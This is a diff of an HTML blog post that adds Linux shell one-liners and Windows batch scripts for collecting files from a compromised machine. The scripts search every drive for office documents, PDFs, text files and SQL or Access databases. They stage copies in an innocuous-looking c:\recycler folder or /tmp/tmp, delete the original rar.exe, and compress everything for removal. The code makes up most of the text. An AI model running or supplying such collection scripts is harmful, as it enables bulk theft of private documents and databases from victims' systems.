@@ -117,7 +117,7 @@
 
       <div class="read-time">
         <small>
-          2 minute read
+          3 minute read
         </small>
       </div>
 
@@ -134,6 +134,9 @@
 <div class="highlighter-rouge"><pre class="highlight"><code>-----------------content of 1.sh--------------------
 mkdir /tmp/tmp &amp;&amp; find / -name "*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*.xlsx" &gt; /tmp/tmp/xlsx.list &amp;&amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;&amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;&amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;&amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;&amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;&amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;&amp; echo ok
 --------------------end-----------------------------
+
+mysql:
+mkdir /tmp/tmp &amp;&amp; find / -name "*.sql" &gt; /tmp/tmp/tmp.list  &amp;&amp; tar -T /tmp/tmp/tmp.list -czf /tmp/tmp/tmp.tar.gz  &amp;&amp; echo ok
 </code></pre>
 </div>
 
@@ -151,8 +154,17 @@ goto :main
 dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
 :main
 set str=c d e f g h i j k l m n o p q r s t u v w x y z 
+
+if not exist c:\recycler (
+md c:\recycler
+md c:\recycler\tmp
+        )
+
+if exist c:\recycler (
 rd /s/q c:\recycler\tmp
 md c:\recycler\tmp
+        )
+
 echo  当前硬盘的分区有: 
 for %%i in (%str%) do (
 if exist %%i: (echo %%i:
@@ -195,12 +207,59 @@ echo %%j &gt;&gt; c:\recycler\tmp\tmp.txt
 )
 )
 
+copy rar.exe c:\recycler\rar.exe
+echo "y" | del rar.exe
+
 c:\recycler\rar.exe a -k -r -s -m1 c:\recycler\tmp\tmp.rar c:\recycler\tmp\*.*
+echo ok
 ------------------end--------------------------------
 
 or
-
 c:\recycler\7z a -t7z C:\recycler\tmp\test.7z C:\recycler\tmp\*.*
+
+
+-------------------mysql&amp;access.bat---------------------
+@echo off
+goto :main
+这是注释:(for /f "delims="的作用为取消默认的以空格等符号作为分割符
+mdf和ldf文件无法直接复制,需要shadow copy
+dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
+:main
+set str=c d e f g h i j k l m n o p q r s t u v w x y z 
+
+if not exist c:\recycler (
+md c:\recycler
+md c:\recycler\tmp
+        )
+
+if exist c:\recycler (
+rd /s/q c:\recycler\tmp
+md c:\recycler\tmp
+        )
+
+echo  当前硬盘的分区有: 
+for %%i in (%str%) do (
+if exist %%i: (echo %%i:
+
+for /f "delims=" %%j in ('dir /b /s "%%i:\*.sql"') do (
+echo "yes" | copy "%%j" c:\recycler\tmp
+echo %%j &gt;&gt; c:\recycler\tmp\tmp.txt
+)
+
+for /f "delims=" %%j in ('dir /b /s "%%i:\*.mdb"') do (
+echo "yes" | copy "%%j" c:\recycler\tmp
+echo %%j &gt;&gt; c:\recycler\tmp\tmp.txt
+)
+
+)
+)
+
+copy rar.exe c:\recycler\rar.exe
+echo "y" | del rar.exe
+
+c:\recycler\rar.exe a -k -r -s -m1 c:\recycler\tmp\tmp.rar c:\recycler\tmp\*.*
+echo ok
+---------------------end-------------------------
 </code></pre>
 </div>
 
